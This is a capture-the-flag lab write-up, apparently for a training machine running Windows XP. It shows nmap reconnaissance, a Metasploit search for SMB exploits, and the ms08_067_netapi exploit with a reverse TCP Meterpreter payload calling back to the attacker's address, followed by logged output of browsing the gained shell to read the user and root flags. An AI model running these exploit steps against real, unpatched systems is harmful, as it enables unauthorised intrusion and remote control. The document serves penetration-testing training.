# Connect to the machine 

use openvpn or another vpn to connect to the machine as follows 

```shell
openvpn lab_acountname.ovpn
```

after that try to ping the machine to make sure you are connected 


```shell
ping 10.10.10.4
```

if you get response then we are ready to enumerate


# Recon

 using Nmap with default scripts with default scripts and with services versions

```shell
sudo nmap -sV -sS 10.10.10.4
```


which results to 

```shell

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 10:42 EDT
Nmap scan report for 10.10.10.4
Host is up (0.099s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds

```


to summery this result we have 4 ports open :

1. 135 msrpc
2. 139 netbios-ssn
3. 445 microsoft-ds


OS : **Windows XP**


# Enumeration


## msrpc
i tried first exploiting the service according to [hacktricks_MSRPC](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc) , but looks like we have no access over it .

i used Metasploit as follows :

```shell
msfconsole

msf6 > use use auxiliary/scanner/dcerpc/endpoint_mapper

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/dcerpc/endpoint_mapper                   normal  No     Endpoint Mapper Service Discovery


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/dcerpc/endpoint_mapper

[*] Using auxiliary/scanner/dcerpc/endpoint_mapper
msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > options

Module options (auxiliary/scanner/dcerpc/endpoint_mapper):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    135              yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > run

[*] 10.10.10.4:135        - Connecting to the endpoint mapper service...
[*] 10.10.10.4:135        - Could not obtain the endpoint list: DCERPC FAULT => nca_s_fault_access_denied
[*] 10.10.10.4:135        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

it looks like we should look for the other services

### SMB

the other two ports are used for smb services , following  [hacktricks_SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb) we can search inside metasploit for an exploit with the following command

```shell

msf> search type:exploit platform:windows target:xp smb
searchsploit microsoft smb

->
Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/smb/ms03_049_netapi                    2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   1   exploit/windows/smb/ms04_007_killbill                  2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   2   exploit/windows/smb/ms04_011_lsass                     2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   3   exploit/windows/smb/ms05_039_pnp                       2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   4   exploit/windows/smb/ms06_025_rras                      2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   5   exploit/windows/smb/ms06_040_netapi                    2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   6   exploit/windows/smb/ms06_066_nwapi                     2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   7   exploit/windows/smb/ms06_066_nwwks                     2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   8   exploit/windows/smb/ms06_070_wkssvc                    2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   9   exploit/windows/smb/ms08_067_netapi                    2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   10  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32  2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   11  exploit/windows/fileformat/ms13_071_theme              2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   12  exploit/windows/smb/netidentity_xtierrpcpipe           2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   13  exploit/windows/fileformat/ursoft_w32dasm              2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   14  exploit/windows/fileformat/vlc_smb_uri                 2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow


Interact with a module by name or index. For example info 14, use 14 or use exploit/windows/fileformat/vlc_smb_uri

```

i changed the target from 2008 to xp , as we have a windows xp server.

we see alot of exploits available so i decided to use the `exploit/windows/smb/ms08_067_netapi` as its rank is **great** and it has **check**

first we choose and adjust the module as follows 

```shell

msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > use exploit/windows/smb/ms08_067_netapi 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.2
LHOST => 10.10.16.2


```


lets check is the system is vulnerable 

```shell
msf6 exploit(windows/smb/ms08_067_netapi) > check

->
[+] 10.10.10.4:445 - The target is vulnerable.
```

and it is indeed vulnerable :D

lets run the exploit

```shell
exploit

->
[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.4:1036) at 2023-08-19 10:56:51 -0400

meterpreter > 

```

and we landed a meterpreter shell

## Capturing the Flag

lets go through the system using the meterpreter shell and find the flag 

```shell
meterpreter > pwd
C:\
meterpreter > ls -l
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-16 01:30:44 -0400  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-16 01:30:44 -0400  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 02:07:20 -0400  Documents and Settings
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  IO.SYS
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 16:13:04 -0400  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 15:41:18 -0500  Program Files
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:59 -0400  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 08:10:06 -0400  WINDOWS
100666/rw-rw-rw-  211     fil   2017-03-16 01:26:58 -0400  boot.ini
100444/r--r--r--  250048  fil   2008-04-13 18:01:44 -0400  ntldr
000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Documents\ and\ Settings\\
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 02:07:21 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 01:29:48 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:37 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:43 -0400  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:42 -0400  john

meterpreter > cd john\\
meterpreter > ls
Listing: C:\Documents and Settings\john
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:50 -0400  Application Data
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:27 -0400  Cookies
040777/rwxrwxrwx  0       dir   2017-03-16 02:19:33 -0400  Desktop
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:55 -0400  Favorites
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:54 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 02:19:59 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2023-08-24 11:24:19 -0400  NTUSER.DAT.LOG
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  NetHood
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  PrintHood
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:54 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:44 -0400  SendTo
040555/r-xr-xr-x  0       dir   2017-03-16 01:20:48 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-03-16 01:28:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 02:19:59 -0400  ntuser.ini

meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:19:49 -0400  user.txt

meterpreter > cat user.txt
<hided the answer :P >

```


lets see if we have read rights over the Administrator Directory and try to read the root flag

```shell

meterpreter > cd ..
meterpreter > ls
Listing: C:\Documents and Settings\john
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:50 -0400  Application Data
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:27 -0400  Cookies
040777/rwxrwxrwx  0       dir   2017-03-16 02:19:33 -0400  Desktop
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:55 -0400  Favorites
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:54 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 02:19:59 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2023-08-24 11:24:19 -0400  NTUSER.DAT.LOG
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  NetHood
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  PrintHood
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:54 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-03-16 01:33:44 -0400  SendTo
040555/r-xr-xr-x  0       dir   2017-03-16 01:20:48 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-03-16 01:28:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 02:19:59 -0400  ntuser.ini

meterpreter > cd ..
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 02:07:21 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 01:29:48 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:37 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:43 -0400  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:42 -0400  john

meterpreter > cd Administrator\\
meterpreter > ls
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:29 -0400  Application Data
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:27 -0400  Cookies
040777/rwxrwxrwx  0       dir   2017-03-16 02:18:27 -0400  Desktop
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:32 -0400  Favorites
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:31 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2022-05-28 06:28:03 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2023-08-24 11:24:19 -0400  NTUSER.DAT.LOG
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  NetHood
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  PrintHood
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:31 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:24 -0400  SendTo
040555/r-xr-xr-x  0       dir   2017-03-16 01:20:48 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-03-16 01:28:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2022-05-28 06:28:03 -0400  ntuser.ini

meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:50 -0400  root.txt

meterpreter > cat root.txt
<hided the answer :P >
```


# Lesson

- when finding an older version of an OS or service try to look for available modules for it in **Metasploit** ,it will make your life much easier .
